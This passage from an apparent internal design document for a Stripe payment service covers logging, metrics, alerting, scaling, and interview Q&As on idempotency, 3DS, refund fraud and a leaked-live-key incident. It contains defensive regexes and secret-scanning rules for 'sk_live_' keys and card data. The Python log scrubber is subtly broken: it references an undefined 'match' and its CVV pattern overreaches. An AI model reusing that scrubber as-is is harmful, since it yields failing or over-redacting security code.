  "request_id": "req-uuid",
  "ip_hash": "sha256:...",
  "stripe_event_id": "evt_???",
  "severity": "CRITICAL"
}

{
  "event": "payment.security.rate_limit_exceeded",
  "user_id": "user-uuid",
  "ip_hash": "sha256:...",
  "endpoint": "/payments/confirm",
  "limit": 3,
  "window_seconds": 3600,
  "severity": "MEDIUM"
}
```

**PCI DSS Logging Requirements:**

Per PCI DSS Requirement 10, all payment-related actions must be logged with:
- User identification (user_id hash).
- Type of event.
- Date and time.
- Success or failure indication.
- Origination of the event (IP hash).
- Identity of affected data/system component.

Logs must be:
- Retained for 12 months (3 months immediately available, 9 months archivable).
- Protected from modification (write-once storage, CloudWatch Logs with CloudTrail).
- Reviewed daily for anomalies.

---

### Metrics

```
# Business metrics
payment_volume_total{currency, status}          # Total payment volume
payment_count_total{status}                     # Count by status
payment_amount_total_cents{currency}            # Revenue
refund_volume_total{currency}
dispute_count_total{outcome}

# Technical metrics
payment_api_duration_seconds{endpoint}          # p50, p95, p99
stripe_api_duration_seconds{operation}          # Stripe call latency
payment_stripe_errors_total{error_type}        # Stripe error rates
payment_db_duration_seconds{operation}
payment_idempotency_hits_total                  # Retry detection

# Security metrics (alert-worthy)
payment_amount_mismatch_total                   # Price manipulation attempts
payment_webhook_signature_failures_total        # Forged webhooks
payment_rate_limit_exceeded_total{endpoint}     # Rate limit triggers
payment_test_key_usage_detected_total           # CRITICAL: test key in prod

# Infrastructure
stripe_api_key_age_days                         # Key rotation monitoring
payment_db_connection_pool_utilization
payment_redis_memory_utilization
settlement_worker_lag_seconds                   # How old is oldest unsettled payment
```

---

### Distributed Traces

```
HTTP POST /payments/confirm [1,423ms total]
  ├── middleware.jwt_validate [2.1ms]
  │     └── redis.GET jwt_public_key [0.9ms]
  ├── middleware.rate_limit [1.2ms]
  │     └── redis.INCR rl:payment:user [0.8ms]
  ├── middleware.idempotency_check [1.8ms]
  │     ├── redis.GET idem:uuid [0.7ms]
  │     └── redis.SET idem_lock:uuid [0.6ms]
  ├── handler.validate_payment [8.3ms]
  │     ├── db.query.fetch_order [6.2ms]
  │     │     └── postgres.SELECT total_cents [5.9ms]
  │     └── validation.amount_check [0.1ms]
  ├── handler.create_payment_record [9.1ms]
  │     └── db.query.insert_payment [8.7ms]
  │           └── postgres.INSERT [8.4ms]
  ├── handler.stripe_confirm [1,387ms]           <- dominant cost
  │     ├── http.stripe_api_call [1,385ms]
  │     │     ├── stripe.confirm_payment_intent [1,382ms]
  │     │     │     ├── [network to Stripe: 45ms]
  │     │     │     ├── [Stripe processing: 892ms]  <- card network auth
  │     │     │     └── [response to merchant: 445ms]
  │     │     └── response.parse [1.2ms]
  ├── handler.update_payment_record [7.8ms]
  │     ├── db.query.update_status [6.9ms]
  │     └── db.query.insert_audit_event [4.2ms]
  ├── handler.publish_event [0.8ms]             <- async, non-blocking
  │     └── kafka.publish payment.completed [0.6ms]
  └── middleware.store_idempotency_result [1.1ms]
        └── redis.SETEX idem:uuid [0.8ms]
```

The dominant latency is the Stripe API call (card network authorization). This is external and outside the merchant's control — but it should be monitored. If Stripe p99 latency exceeds 3 seconds, alert and potentially display a "processing" UI to prevent user frustration.

---

### Alerting Rules

| Metric / Event | Alert? | Severity | Action |
|---|---|---|---|
| `payment_amount_mismatch_total` > 0 | YES | CRITICAL | Immediate security review |
| `payment_webhook_signature_failures_total` > 0 | YES | HIGH | Investigate forged webhook source |
| `payment_test_key_usage_detected_total` > 0 | YES | CRITICAL | Immediate: block all payments, alert CTO |
| `stripe_api_duration_seconds` p99 > 3s | YES | MEDIUM | Customer experience degradation |
| `settlement_worker_lag_seconds` > 86400 (1 day) | YES | HIGH | Captures at risk of expiring |
| `dispute_count_total` rate > 1% of volume | YES | HIGH | Fraud pattern detected |
| `payment_stripe_errors_total{error_type="rate_limit"}` spike | YES | MEDIUM | Scale out, notify Stripe |
| `payment_db_connection_pool_utilization` > 80% | YES | MEDIUM | Scale DB connections |
| `stripe_api_key_age_days` > 90 | YES | MEDIUM | Key rotation overdue |
| Normal payment success rate > 95% | NO | -- | Expected |
| Single payment failure (card declined) | NO | -- | Normal user experience |
| `payment_idempotency_hits_total` > 0 | NO (unless spike) | -- | Normal retry behavior |
| Large single payment (over $1000) | YES (review queue) | LOW | Fraud screening, not block |

---

## 13. Scaling Considerations

### Bottlenecks

**1. Stripe API as the primary bottleneck:**
Every payment confirmation requires a synchronous call to Stripe, which itself requires card network authorization. The merchant cannot parallelize or cache this — it's inherently sequential and external.

```
Stripe p50: ~300ms
Stripe p95: ~800ms
Stripe p99: ~2000ms

At 100 TPS peak: 100 × average 400ms = need 40 concurrent Stripe API connections
Payment Service needs: connection pool of 50+ to Stripe
```

**2. PostgreSQL write contention:**
Two DB writes per payment (INSERT + UPDATE). With PgBouncer transaction-mode pooling, a 20-connection pool can handle ~500 TPS of payment writes (assuming ~40ms per DB operation, 40ms × 500 / 1000 = 20 connections).

**3. Idempotency key Redis contention:**
Each payment touches 3 Redis keys (check, lock, store result). At 500 TPS: 1,500 Redis ops/second. A single Redis node handles ~100K ops/sec — not a bottleneck until much higher scale.

**4. Settlement worker:**
Batch settlement processes hundreds of captures. If the batch is too large, it can exceed Stripe's rate limits or hold DB locks for too long. Solution: cap batch size to 100 captures per run, run every 30 seconds.

---

### Horizontal Scaling

**Payment Service:**
Stateless (session state in Redis, payment state in DB). Horizontally scalable. Run 3–10 instances behind nginx load balancer. Auto-scale based on p95 latency of `/payments/confirm` endpoint (not CPU — the bottleneck is Stripe API wait time, not CPU).

```yaml
# Kubernetes HPA for Payment Service
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
spec:
  minReplicas: 3
  maxReplicas: 20
  metrics:
  - type: Pods
    pods:
      metric:
        name: payment_api_p95_latency_ms
      target:
        averageValue: 800m  # Scale up if p95 > 800ms
```

**PostgreSQL:**
The payments DB is write-heavy (every payment = 2 writes). Vertical scaling (larger instance) before horizontal. For extreme scale: read replicas for reporting queries; primary for all payment writes. Sharding by user_id for very high volume.

**Redis:**
Idempotency keys can be sharded across a Redis Cluster (multiple nodes). Rate limit keys need to be on the same shard for atomic INCR — use hash tags: `{user_id}:payment_rate_limit` ensures all rate limit keys for a user are on the same shard.

**Settlement Workers:**
Multiple workers can run simultaneously using `FOR UPDATE SKIP LOCKED` — each worker claims its own batch of payments to capture without blocking the others.

---

### Consistency Tradeoffs

**Payment state machine must be strongly consistent:**

```
Valid state transitions:
  pending -> processing -> succeeded
  pending -> processing -> failed
  succeeded -> refund_initiated -> refunded
  succeeded -> disputed -> dispute_won/dispute_lost

Invalid transitions must be prevented:
  succeeded -> succeeded (double capture)
  failed -> succeeded (state reversal)
  refunded -> succeeded (refund reversal)
```

All state transitions must happen in PostgreSQL with `FOR UPDATE` locking. No eventual consistency here — a payment cannot be "approximately succeeded."

**Idempotency keys can be eventually consistent:**
Redis idempotency keys have a brief window (after the DB write but before Redis is updated) where a retry could re-process. The DB-level unique constraint on `payment_intent_id` prevents actual double processing — Redis is a performance optimization, not the sole correctness mechanism.

**Stripe webhook delivery is at-least-once:**
Stripe may deliver the same webhook multiple times (network retries, Stripe's own retries). The application MUST handle this idempotently using the event ID as the deduplication key.

**Settlement consistency:**
Capture must happen exactly once per payment. The `FOR UPDATE NOWAIT` DB lock ensures only one settlement worker captures each payment. If a worker crashes after capturing at Stripe but before updating the DB: on next run, the worker tries to capture again. Stripe returns a "PaymentIntent already captured" error. The worker should recognize this error and update the DB to `captured` status (idempotent recovery).

---

## 14. Interview Questions

### Q1: Why does the payment flow use Stripe's hosted fields (iframes) instead of a regular HTML form? What happens to PCI scope if you implement your own card input fields?

**Hosted fields security model:**

Stripe's hosted fields render card input fields as iframes served from `js.stripe.com`. The merchant's JavaScript cannot read iframe contents (same-origin policy). Card data is captured inside Stripe's iframe and sent directly from the browser to Stripe's servers — never touching the merchant's servers.

**PCI DSS scope with hosted fields (SAQ A):**
- Merchant's servers never transmit, process, or store cardholder data.
- Scope is minimal: just the web server that delivers the checkout page.
- Annual assessment: Self-Assessment Questionnaire A (SAQ A) — the simplest form.
- ~22 controls to meet.

**PCI DSS scope with own card input fields (SAQ D):**
- Merchant's servers receive card data in HTTP requests.
- Every system that handles card data is in scope: web servers, load balancers, app servers, databases, network devices, monitoring systems.
- Annual assessment: SAQ D — the most comprehensive.
- ~300+ controls to meet.
- Requires annual QSA (Qualified Security Assessor) visit for many merchants.
- Cost: $50K–$500K+ per year for full SAQ D compliance.

**What if you build your own JavaScript card capture (not iframes):**
The JavaScript runs in the merchant's origin, meaning:
- The card data is accessible to the merchant's JavaScript (via event listeners).
- Any XSS vulnerability can steal card data.
- The merchant's CDN serves the payment JavaScript — a CDN compromise → card skimming.
- The merchant is now in full PCI scope.

This is why Magecart-style attacks (injecting malicious JavaScript into e-commerce sites) are so devastating — they target merchants who capture card data in their own JavaScript.

---

### Q2: Explain what happens if the browser request completes but the connection drops before the merchant's server returns the response. How does idempotency prevent double charging?

**The scenario:**
1. User clicks "Pay." Browser sends `POST /payments/confirm`.
2. Server receives request, processes payment: Stripe charges the card successfully.
3. Network drops before the `200 OK` response reaches the browser.
4. Browser times out and the SPA shows an error state.
5. User, seeing "payment failed," clicks "Pay" again.

**Without idempotency:**
The second `POST /payments/confirm` is processed independently:
- A new payment record is created.
- Stripe is asked to confirm the PaymentIntent again.
- If the PaymentIntent is already `succeeded`, Stripe returns an error.
- But the merchant may create a new PaymentIntent and charge the card again.
- Result: double charge.

**With idempotency (correct implementation):**

The SPA generates ONE UUID per checkout session as the idempotency key. This key persists in the SPA's memory (or sessionStorage) for the duration of the checkout.

First request: `X-Idempotency-Key: uuid-A`. Server:
1. Checks Redis: `GET idem:uuid-A` → nil (first time).
2. Sets Redis lock: `SET idem_lock:uuid-A 1 NX EX 30`.
3. Processes payment. Stripe charges succeed.
4. Stores result in Redis: `SET idem:uuid-A {status:succeeded, payment_id:xxx} EX 86400`.
5. Response lost in transit.

Second request (retry): `X-Idempotency-Key: uuid-A`. Server:
1. Checks Redis: `GET idem:uuid-A` → `{status:succeeded, payment_id:xxx}`.
2. Returns the cached result immediately.
3. No new Stripe API call. No second charge.

The user sees "payment successful" on the retry — correct behavior.

**Edge case — server crashed after charging but before caching:**
If the server crashes between steps 3 and 4 above, the idempotency cache is empty but the payment succeeded at Stripe. On retry, the server tries to confirm the PaymentIntent again. Stripe returns `PaymentIntent already succeeded`. The server must handle this response by:
1. Looking up the existing payment record by `payment_intent_id`.
2. Returning the existing payment record as the response.
3. Storing the result in the idempotency cache.

This is why the DB-level unique constraint on `payment_intent_id` is critical — it prevents creating a second payment record for an already-confirmed PaymentIntent.

---

### Q3: What is the difference between authorization and capture in a payment flow? When would you use delayed capture, and what are the failure modes?

**Authorization:** The issuing bank verifies the cardholder's account has sufficient funds and "reserves" (holds) those funds. No money moves. The authorization code is proof of this reservation. Authorization typically expires in 7 days (Visa/Mastercard default).

**Capture:** The merchant instructs the card network to actually transfer the authorized funds from the cardholder's account to the merchant's account. This is when money moves. Capture must happen within the authorization window.

**Immediate capture:** Authorization and capture happen in the same API call. Used for:
- Digital goods (delivered immediately).
- Ready-to-ship physical goods.

**Delayed capture:** Authorization happens at checkout; capture happens later. Used for:
- E-commerce with fulfillment (capture when shipped — reduces chargebacks and disputes).
- Hotels and rentals (authorize at booking, capture at check-in/out).
- Pre-orders (authorize now, capture when product ships).

**Failure modes of delayed capture:**

1. **Authorization expires before capture:**
   - Visa/Mastercard default window: 7 days.
   - If fulfillment takes longer (backordered item, slow fulfillment), the authorization expires.
   - The merchant tries to capture → Stripe error: "Payment has expired."
   - Merchant must either: accept the loss, or contact the customer to re-authorize.

2. **Issuer revokes authorization:**
   - Some issuers revoke authorizations if the card is reported lost/stolen or the account is closed.
   - Capture attempt fails → lost sale + already-fulfilled order.

3. **Settlement worker falls behind:**
   - If the settlement worker has a bug or backlog, captures are delayed.
   - Authorization window may expire.
   - Monitoring: alert if any payment is authorized for >5 days without capture.

4. **Race condition on capture:**
   - Multiple settlement worker instances try to capture the same payment.
   - Solution: `SELECT FOR UPDATE NOWAIT` prevents double capture.
   - Stripe also handles this: confirming an already-captured PaymentIntent returns an error, not a double capture.

**Implementation for delayed capture:**
```python
# At checkout: create PaymentIntent with capture_method=manual
pi = stripe.PaymentIntent.create(
    amount=9999,
    currency="usd",
    capture_method="manual",  # Authorize only, don't capture yet
    payment_method=payment_method_id,
    confirm=True
)
# pi.status = "requires_capture"

# At fulfillment (when order ships):
stripe.PaymentIntent.capture(pi.id)
# pi.status = "succeeded"
```

---

### Q4: How would you design the system to prevent a fraudulent employee from approving fake refunds to accounts they control?

**The attack:** An insider with access to the payment service submits API calls to refund legitimate charges but routes the refund to a different bank account or credit card.

**Note on refund mechanics:** In standard card payments, refunds go back to the original payment method — the merchant CANNOT redirect a refund to a different card or bank account. This is a card scheme rule enforced by Stripe.

**But:** If the merchant uses Stripe Connect or Stripe Payouts, there are additional attack vectors:
- Payouts to bank accounts can be redirected (if someone modifies the merchant's bank account details).
- Stripe Connect transfer amounts can be manipulated.

**Controls for refund fraud:**

1. **Dual approval for refunds above threshold:**
   ```python
   def create_refund(payment_id, amount, requester):
       if amount > REFUND_APPROVAL_THRESHOLD:  # e.g., $500
           # Create a pending refund that requires second approval
           return create_pending_refund(payment_id, amount, requester)
       else:
           return process_refund_immediately(payment_id, amount)

   def approve_refund(refund_id, approver):
       if approver.user_id == refund.requester.user_id:
           raise SelfApprovalNotAllowed()
       # Process the refund
   ```

2. **4-eyes principle on Stripe payout configuration:**
   Any changes to bank account details or payout schedules require two authorized approvers + out-of-band notification to the CFO.

3. **Immutable refund audit trail:**
   Every refund action is logged to an append-only table with the requester's identity, timestamp, IP, and reason.

4. **Stripe notification on refunds:**
   Enable Stripe's notification emails for all refund activity. These go to the finance team, not just the engineering team.

5. **Reconciliation:**
   Daily automated reconciliation: compare Stripe's refund total against the merchant's internal refund records. Discrepancies alert immediately.

6. **Anomaly detection:**
   An employee who processes 50 refunds in one hour (vs. average 2/hour) triggers an alert even before the refunds are reviewed.

7. **RBAC with principle of least privilege:**
   Only specific roles have refund authority. Those roles cannot also create new payment records. Separation of duties prevents one person from both creating and refunding fraudulent payments.

---

### Q5: What is 3D Secure (3DS2), how does it work mechanically, and when does liability shift occur?

**3D Secure (3DS2) overview:**
3DS2 is an authentication protocol that adds a step between card authorization and the issuing bank. It creates a cryptographic proof that the cardholder (not just the card number) authenticated the transaction.

**Mechanical flow:**

1. **Risk assessment (passive):** The 3DS2 protocol first tries a "frictionless flow" — the issuing bank receives device fingerprint data, transaction history, and behavioral signals collected by the SDK. The bank decides if additional authentication is needed.

2. **Frictionless flow:** If the bank is satisfied (low-risk transaction, known device), it approves without user interaction. The entire 3DS process is invisible to the user.

3. **Challenge flow:** If the bank requires authentication, the user sees a popup/modal (in-browser or in-app) to authenticate — typically via OTP, biometric, or banking app push notification.

4. **Authentication result:** The issuing bank returns an `authentication_value` (CAVV — Cardholder Authentication Verification Value) and an `eci` (Electronic Commerce Indicator) code. These are proof of authentication.

5. **Stripe includes these in the authorization request to the card network.**

**Liability shift:**

| Scenario | Who bears chargeback liability |
|---|---|
| 3DS not used | Merchant |
| 3DS used, bank approved frictionless | Issuer (bank) |
| 3DS used, cardholder authenticated challenge | Issuer (bank) |
| 3DS used, bank issued challenge but cardholder didn't complete | Merchant |
| 3DS attempted but bank doesn't support it | Merchant |
| 3DS not supported by the card | Merchant (typically) |

**When to require 3DS:**
- Transactions above a threshold (e.g., > $100).
- New devices or geographies.
- High-risk merchant categories.
- Regulatory requirement (PSD2 in Europe mandates Strong Customer Authentication for all non-exempt e-commerce transactions).

**Implementation with Stripe:**
```python
# Payment Intent with 3DS enforcement
pi = stripe.PaymentIntent.create(
    amount=9999,
    currency="usd",
    payment_method_types=["card"],
    # Request 3DS if possible
    payment_method_options={
        "card": {
            "request_three_d_secure": "automatic"  # or "any" for always
        }
    }
)
# If 3DS is required: pi.status = "requires_action"
# Return pi.client_secret to browser
# Stripe.js handles the 3DS popup via confirmPayment()
```

**SCA (Strong Customer Authentication) under PSD2:**
In Europe, PSD2 requires SCA for most electronic transactions. Exemptions exist for:
- Low-value transactions < €30.
- Recurring fixed-amount subscriptions (after initial SCA).
- Merchant-initiated transactions (off-session, after SCA on first transaction).
- Low-risk transactions (based on issuer/acquirer fraud rate TRA exemptions).

Stripe automatically handles SCA exemption logic for EU transactions.

---

### Q6: Explain the exact sequence of database operations needed to safely process a payment and prevent both double-charging and phantom payments.

**The problem:**
A "phantom payment" occurs when the DB shows a payment as succeeded but Stripe was never actually called (bug in the code, exception handling that incorrectly marks success). A "double charge" occurs when Stripe is called twice for the same order.

**The safe sequence:**

```
1. BEGIN TRANSACTION

2. INSERT INTO payments (status='pending', idempotency_key, order_id, ...)
   -- UNIQUE constraint on idempotency_key: if duplicate, TX fails
   -- UNIQUE constraint on order_id (where status != 'failed'): prevents second attempt

3. COMMIT  (DB write is durable here)

4. Call Stripe API (outside DB transaction)
   -- Stripe adds payment to their ledger
   -- Result: success OR failure OR timeout

5. BEGIN TRANSACTION

6a. IF success:
    UPDATE payments SET status='succeeded', stripe_charge_id=...
    INSERT INTO payment_events (type='succeeded', ...)
    COMMIT

6b. IF failure:
    UPDATE payments SET status='failed', failure_code=...
    INSERT INTO payment_events (type='failed', ...)
    COMMIT

6c. IF timeout (don't know if Stripe processed):
    -- Check Stripe API: GET /v1/payment_intents/{pi_id}
    -- If succeeded: follow 6a
    -- If failed: follow 6b
    -- If still processing: retry later with exponential backoff
    -- Store payment in 'processing_uncertain' state

7. PUBLISH EVENT (async, after 6a COMMIT)
   payment.completed or payment.failed
```

**Why the DB write happens BEFORE the Stripe call:**
If we call Stripe first and then try to INSERT into the DB, and the DB insert fails (transient error), we've charged the card but have no record of it. The customer is charged but gets no order fulfillment. By inserting first (with `pending` status), we always have a record, and can query Stripe to determine the outcome.

**Why the idempotency key unique constraint matters:**
If a concurrent retry tries to create a second payment record with the same idempotency key, the UNIQUE constraint fails the INSERT immediately. No second Stripe call is made. The handler catches the constraint violation and queries for the existing payment.

**Recovery from uncertain state:**

```python
def recover_uncertain_payments():
    """Run periodically (every 5 minutes) to resolve uncertain payments."""
    uncertain = db.execute("""
        SELECT id, payment_intent_id
        FROM payments
        WHERE status = 'processing_uncertain'
          AND updated_at < NOW() - INTERVAL '2 minutes'
        LIMIT 50 FOR UPDATE SKIP LOCKED
    """)

    for payment in uncertain:
        pi = stripe.PaymentIntent.retrieve(payment.payment_intent_id)
        if pi.status == 'succeeded':
            mark_payment_succeeded(payment.id, pi)
        elif pi.status in ('canceled', 'payment_failed'):
            mark_payment_failed(payment.id, pi)
        # else: still processing -- leave for next cycle
```

---

### Q7: A QA engineer accidentally used the Stripe live API key in a staging environment, and 50 real customer cards were charged. What is the incident response process?

**Immediate (0–30 minutes):**

1. **Revoke the compromised API key immediately in Stripe Dashboard.** This stops any further charges.
2. **Generate a new restricted API key** with only the permissions needed.
3. **Deploy the new key** to production (via Secrets Manager update + rolling restart).
4. **Preserve evidence:** Export the Stripe event log for all API calls made with the compromised key. Download the list of all charges, customers accessed, and data retrieved.
5. **Alert the security team, CTO, and legal/compliance.**

**Short-term (30 minutes – 4 hours):**

6. **Identify all affected customers:** Which customers were charged? For how much? Was any customer data (email, card last 4, billing address) accessed?
7. **Issue immediate refunds** for all erroneous charges via the Stripe Dashboard (or new production key if the staging environment used production customer accounts — this depends on whether staging uses a separate Stripe account, which it should).
8. **Determine root cause:** How did the live key end up in staging? Was it in a config file? An environment variable? Committed to git?

**Customer notification:**

9. **Contact affected customers:** "We accidentally charged your card $X due to a configuration error. We have immediately refunded this charge. The refund will appear within 5–10 business days. We apologize..."
10. **Assess PCI DSS breach notification requirements:** Was cardholder data accessed beyond what's needed to process the charge? If customer PAN data or full card details were exposed: mandatory breach notification to card brands (Visa, Mastercard) within 72 hours, and potentially to customers.

**Systemic fix:**

11. **Separate Stripe accounts for production and staging.** Staging uses `sk_test_xxx` only. No test mode key from a live account.
12. **Git secret scanning:** Add pre-commit hooks and CI/CD checks to detect Stripe live keys (`sk_live_`) in code and configuration.
13. **Audit all other environments** for similar misconfigurations.
14. **Implement automatic environment detection:** Payment Service refuses to start if `STRIPE_KEY` starts with `sk_live_` and `ENVIRONMENT` == `staging`.

```python
# Environment guard
if settings.ENVIRONMENT in ("staging", "development", "test"):
    assert not settings.STRIPE_KEY.startswith("sk_live_"), (
        "FATAL: Live Stripe key detected in non-production environment. "
        "Refusing to start."
    )
```

---

### Q8: How would you architect a payment system to handle 10,000 transactions per second during a peak sale event?

**Constraint analysis at 10K TPS:**

```
10,000 TPS
× 400ms average Stripe API latency
= 4,000 concurrent requests to Stripe at steady state

Stripe connection pool required: 4,000+ connections
(Stripe may rate-limit at this volume -- negotiate enterprise limits)

DB writes: 10,000 TPS × 2 writes = 20,000 writes/second
PostgreSQL single primary: ~10,000 writes/second maximum
→ Need either: write batching, sharding, or async DB writes
```

**Architecture changes for 10K TPS:**

**1. Queue-based payment processing:**
Instead of synchronous payment processing, accept the payment request and queue it:
```
User -> API -> Queue (SQS/Kafka) -> Payment Worker Pool -> Stripe -> DB
                                                         -> Return via webhook/polling
```
Users see "payment is being processed" immediately. They poll for status or receive a WebSocket notification when complete. This decouples user-facing API from Stripe API rate limits.

**2. Horizontal scaling of Payment Workers:**
Run 200+ Payment Service instances, each with a connection pool of 20 Stripe connections = 4,000 concurrent Stripe calls.

**3. PostgreSQL sharding by user_id:**
Shard the payments table across 10 PostgreSQL instances by `user_id % 10`. Each shard handles 1,000 TPS of writes.

**4. Redis Cluster for idempotency:**
Idempotency keys sharded across a 6-node Redis Cluster (3 masters, 3 replicas). Each node handles ~50K ops/second.

**5. Pre-authorization for known users:**
For users with saved payment methods, pre-authorize their likely purchase amount before the sale. Capture at purchase time (much faster than full authorization flow).

**6. Circuit breaker pattern:**
If Stripe returns `429 Too Many Requests`, the circuit breaker trips. Payments are queued and retried when Stripe capacity recovers. The user sees "processing" rather than "failed."

**7. Database write optimization:**
```sql
-- Batch idempotency key storage
-- Instead of per-payment SETEX, batch into Lua script
-- Or use PostgreSQL COPY for bulk inserts to payment_events
```

**Honest answer:** At 10K TPS, you would need a dedicated Stripe enterprise account with negotiated rate limits, and likely a hybrid approach: Stripe for card processing, but self-hosted payment routing for some card networks (direct acquiring relationship with Visa/Mastercard) to avoid dependency on a single payment processor.

---

### Q9: What is the risk of logging payment request bodies for debugging, and how do you implement safe debugging for payment systems?

**The risk:**

A developer enables request body logging for debugging a payment issue:
```python
# Developer adds temporarily:
logger.debug("Payment request body: %s", json.dumps(request.body))
```

The log entry:
```
2024-11-15 10:23:45 DEBUG Payment request body:
{"payment_intent_id": "pi_xxx", "order_id": "order_abc",
 "amount_cents": 9999, "billing_email": "customer@example.com"}
```

**This is actually relatively safe** because the merchant never sees raw card data (thanks to hosted fields). But there are still risks:

1. If the front-end accidentally includes card data in the request body (misconfiguration where the card form is not using iframes correctly), it would be logged.
2. Billing email and order details are PII — logging them in high-volume logs may violate GDPR.
3. Log aggregation to third-party tools (Datadog, Splunk) exports PII outside the payment environment.

**For payment systems that DO handle card data (legacy, non-hosted-fields):**

Logging request bodies is a PCI DSS violation if card data appears in logs. PCI DSS Requirement 3.2.1 prohibits storing sensitive authentication data, including if it appears in debug logs.

**Safe debugging practices:**

```python
class PaymentRequestScrubber:
    """Scrub sensitive data from payment request logs."""

    # Patterns to redact
    PATTERNS = [
        (r'\b\d{13,19}\b', '[PAN_REDACTED]'),        # Card numbers
        (r'\d{3,4}(?=\s*")', '[CVV_REDACTED]'),       # CVV/CVC near quotes
        (r'(?<=exp_month": )\d+', '[EXP_REDACTED]'),  # Expiry
        (r'(?<=exp_year": )\d+', '[EXP_REDACTED]'),
        (r'sk_live_[a-zA-Z0-9]+', '[STRIPE_KEY_REDACTED]'),  # API keys
    ]

    def scrub(self, log_dict: dict) -> dict:
        log_str = json.dumps(log_dict)
        for pattern, replacement in self.PATTERNS:
            log_str = re.sub(pattern, replacement, log_str)
        # Also hash any email addresses
        log_str = re.sub(
            r'"[^"]+@[^"]+\.[^"]+"',
            f'"[EMAIL_HASH:{hashlib.sha256(match.group().encode()).hexdigest()[:8]}]"',
            log_str
        )
        return json.loads(log_str)

# Apply to all payment-related logging:
safe_payload = scrubber.scrub(request.body)
logger.debug("Payment request (scrubbed)", payload=safe_payload)
```

**Distributed tracing as a debugging alternative:**
Instead of logging request bodies, use distributed tracing (Jaeger/Zipkin) with span attributes that contain only non-sensitive data (payment_id, order_id, status, duration). The trace provides debugging visibility without sensitive data:

```python
with tracer.start_span("payment.confirm") as span:
    span.set_attribute("payment.id", payment_id)
    span.set_attribute("payment.order_id", order_id)
    span.set_attribute("payment.amount_cents", amount_cents)
    span.set_attribute("payment.currency", currency)
    # NOT: span.set_attribute("payment.card_number", ...)
```

---

### Q10: How do you handle partial failures in the payment flow — specifically when Stripe returns success but the database write fails?

**The scenario:**

```python
# Stripe call succeeds
stripe_response = stripe.PaymentIntent.confirm(payment_intent_id)
# stripe_response.status = "succeeded"
# Card has been charged at this point

# Database write fails (transient error, connection lost)
db.execute("UPDATE payments SET status='succeeded' WHERE id=$1", payment_id)
# -> psycopg2.OperationalError: could not connect to server
```

**State of the system:**
- Stripe: Payment confirmed, customer charged.
- DB: Payment still in `pending` state (or worse: no record).
- User: Received an error page.

**Why this is a serious problem:**
1. Customer was charged but has no confirmation.
2. Customer calls support: "I was charged but didn't receive the product."
3. Without a DB record, merchant has no visibility into the payment.
4. If the customer retries checkout, they could be charged again.

**Recovery mechanism:**

```python
class PaymentConfirmationHandler:

    def confirm_with_resilience(self, payment_intent_id, payment_id):
        # Step 1: Call Stripe
        try:
            stripe_result = stripe.PaymentIntent.confirm(payment_intent_id)
        except stripe.error.StripeError as e:
            # Stripe-side failure: safe to fail the payment
            self.mark_payment_failed(payment_id, e)
            raise PaymentFailed(e)

        # Step 2: Stripe succeeded -- card is charged
        # We MUST successfully record this, regardless of transient DB errors
        retry_count = 0
        last_error = None
        while retry_count < 10:
            try:
                self.record_payment_success(payment_id, stripe_result)
                return  # Success
            except DatabaseError as e:
                last_error = e
                retry_count += 1
                time.sleep(2 ** retry_count + random.uniform(0, 1))  # Exponential backoff

        # If all DB retries exhausted:
        # 1. Publish an emergency event to a durable queue
        emergency_queue.publish({
            "type": "payment_reconciliation_needed",
            "payment_id": payment_id,
            "stripe_pi_id": payment_intent_id,
            "stripe_status": stripe_result.status,
            "error": str(last_error),
            "timestamp": datetime.now().isoformat()
        })

        # 2. Alert the on-call team immediately
        pagerduty.trigger("Payment DB write failure after Stripe success",
                         severity="critical", payment_id=payment_id)

        # 3. Return success to the user (they were charged -- give them the product)
        # Reconciliation worker will fix the DB record
        return PaymentResult(succeeded=True, needs_reconciliation=True)

    def reconciliation_worker(self):
        """Processes emergency queue items to reconcile DB with Stripe."""
        for item in emergency_queue.consume():
            # Query Stripe for ground truth
            pi = stripe.PaymentIntent.retrieve(item["stripe_pi_id"])
            if pi.status == "succeeded":
                # Upsert the payment record
                db.execute("""
                    INSERT INTO payments (id, status, stripe_charge_id, ...)
                    VALUES ($1, 'succeeded', $2, ...)
                    ON CONFLICT (id) DO UPDATE
                    SET status = 'succeeded', stripe_charge_id = $2
                """, item["payment_id"], pi.latest_charge)
```

**The key insight:** When Stripe succeeds and the DB fails, the correct behavior is to:
1. Return success to the user (they were charged — they deserve their product).
2. Ensure the DB is eventually consistent through a reconciliation mechanism.
3. Never retry the Stripe charge — it already succeeded.

This is a "money cannot disappear" principle: if Stripe charged the customer, the merchant MUST deliver the product, and the DB MUST eventually reflect the successful payment.

---

*Document version: 1.0 | Classification: CONFIDENTIAL — Internal Engineering*  
*PCI DSS scope: This document describes the architecture; actual PCI DSS compliance requires a formal QSA assessment.*  
*Do not distribute externally. Contains security-sensitive payment system architecture.*
